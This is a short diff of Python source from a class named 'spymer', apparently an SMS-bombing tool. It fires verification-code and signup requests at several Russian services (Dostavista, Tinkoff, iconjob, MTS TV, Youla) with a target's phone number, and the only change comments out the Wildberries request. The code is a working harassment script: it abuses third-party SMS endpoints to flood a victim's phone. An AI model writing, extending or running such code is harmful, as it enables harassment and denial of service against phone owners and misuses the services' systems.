@@ -66,7 +66,7 @@ class spymer:
 			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
 			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
 			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', json={"phone": _phone}, headers={})
-			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
+			#wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
 			mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
 
 			youla = requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
